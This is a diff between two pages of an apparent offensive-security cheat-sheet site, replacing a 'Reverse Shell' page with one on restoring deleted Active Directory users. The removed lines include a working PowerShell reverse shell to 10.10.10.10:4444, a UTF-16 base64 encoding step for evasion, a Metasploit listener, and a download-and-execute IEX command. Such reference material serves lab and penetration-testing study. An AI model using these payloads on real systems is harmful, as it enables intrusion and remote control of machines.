@@ -8,13 +8,11 @@
       
       
       
-        <link rel="canonical" href="https://manatliqhackers.github.io/active-directory/getting-a-shell/">
+        <link rel="canonical" href="https://manatliqhackers.github.io/active-directory/deleted-users/">
       
       
-        <link rel="prev" href="../transferring-file/">
+        <link rel="prev" href="../getting-computers/">
       
-      
-        <link rel="next" href="../bloodhound/">
       
       
         
@@ -25,7 +23,7 @@
     
     
       
-        <title>Reverse Shell - Manatliq CheatSheets</title>
+        <title>Retrieve Deleted Users - Manatliq CheatSheets</title>
       
     
     
@@ -76,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#reverse-shell" class="md-skip">
+        <a href="#get-deleted-users" class="md-skip">
           Skip to content
         </a>
       
@@ -112,7 +110,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Reverse Shell
+              Retrieve Deleted Users
             
           </span>
         </div>
@@ -232,8 +230,6 @@
       
   
   
-    
-  
   
   
     
@@ -246,11 +242,13 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
         
           
           <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
@@ -271,7 +269,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_2">
             <span class="md-nav__icon md-icon"></span>
             
@@ -314,35 +312,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Reverse Shell
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../getting-a-shell/" class="md-nav__link">
         
   
   
@@ -358,79 +331,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#reverse-shell" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Reverse Shell
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#paylod-to-utf-16" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Paylod to UTF-16
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#set-up-listener" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Set up listener
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#rev-shell" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Rev Shell
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#rev-shell-via-evasion" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Rev Shell via Evasion
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -503,8 +403,10 @@
       
   
   
+    
   
   
+  
     
     
     
@@ -515,13 +417,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
         
           
           <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
@@ -542,7 +442,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_3">
             <span class="md-nav__icon md-icon"></span>
             
@@ -585,10 +485,35 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../deleted-users/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Retrieve Deleted Users
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -604,6 +529,57 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#get-deleted-users" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Get Deleted Users
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#restore-deleted-user" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Restore Deleted User
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#verify-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Verify Changes
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -641,10 +617,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#reverse-shell" class="md-nav__link">
+  <a href="#get-deleted-users" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Reverse Shell
+        Get Deleted Users
       
     </span>
   </a>
@@ -652,10 +628,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#paylod-to-utf-16" class="md-nav__link">
+  <a href="#restore-deleted-user" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Paylod to UTF-16
+        Restore Deleted User
       
     </span>
   </a>
@@ -663,32 +639,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#set-up-listener" class="md-nav__link">
+  <a href="#verify-changes" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Set up listener
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#rev-shell" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Rev Shell
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#rev-shell-via-evasion" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Rev Shell via Evasion
+        Verify Changes
       
     </span>
   </a>
@@ -712,27 +666,16 @@
 
 
 
-  <h1>Reverse Shell</h1>
+  <h1>Retrieve Deleted Users</h1>
 
-<h3 id="reverse-shell">Reverse Shell</h3>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s1">&#39;10.10.10.10&#39;</span><span class="p">,</span><span class="n">4444</span><span class="p">);</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s1">&#39;PS &#39;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+<h2 id="get-deleted-users">Get Deleted Users</h2>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">Get-ADObject</span> <span class="n">-Filter</span> <span class="s1">&#39;isDeleted -eq $true -and objectClass -eq &quot;user&quot;&#39;</span> <span class="n">-includedeletedobjects</span> <span class="n">-properties</span> <span class="n">objectsid</span><span class="p">,</span> <span class="n">lastknownparent</span><span class="p">,</span> <span class="n">objectguid</span>
 </span></code></pre></div>
-<h3 id="paylod-to-utf-16">Paylod to UTF-16</h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>cat<span class="w"> </span>revshell.ps1<span class="w"> </span><span class="p">|</span><span class="w"> </span>iconv<span class="w"> </span>-f<span class="w"> </span>UTF-8<span class="w"> </span>-t<span class="w"> </span>UTF-16LE<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span>
+<h2 id="restore-deleted-user">Restore Deleted User</h2>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">Get-ADObject</span> <span class="n">-IncludeDeletedObjects</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">objectsid</span> <span class="o">-eq</span> <span class="s1">&#39;S-1-5-21-1392491010-1358638721-2126982587-1111&#39;</span><span class="p">}</span> <span class="p">|</span> <span class="nb">Restore-ADObject</span>
 </span></code></pre></div>
-<h3 id="set-up-listener">Set up listener</h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>msfconsole
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>use<span class="w"> </span>multi/handler
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nb">set</span><span class="w"> </span>payload<span class="w"> </span>windows/powershell_reverse_tcp
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">10</span>.10.14.78
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>exploit
-</span></code></pre></div>
-<h3 id="rev-shell">Rev Shell</h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>powershell.exe<span class="w"> </span>-nop<span class="w"> </span>-exec<span class="w"> </span>bypass<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;&#39;http://10.10.10.10:8000/revshell.ps1&#39;&#39;)&quot;</span>
-</span></code></pre></div>
-<h3 id="rev-shell-via-evasion">Rev Shell via Evasion</h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>powershell.exe<span class="w"> </span>-nop<span class="w"> </span>-exec<span class="w"> </span>bypass<span class="w"> </span>-e<span class="w"> </span>JABjAGwAaQB...
+<h2 id="verify-changes">Verify Changes</h2>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">Get-ADObject</span> <span class="n">-Filter</span> <span class="s1">&#39;Name -eq &quot;cert_admin&quot;&#39;</span> <span class="n">-Properties</span> <span class="p">*</span> <span class="p">|</span> <span class="nb">Format-List</span>
 </span></code></pre></div>
 
 
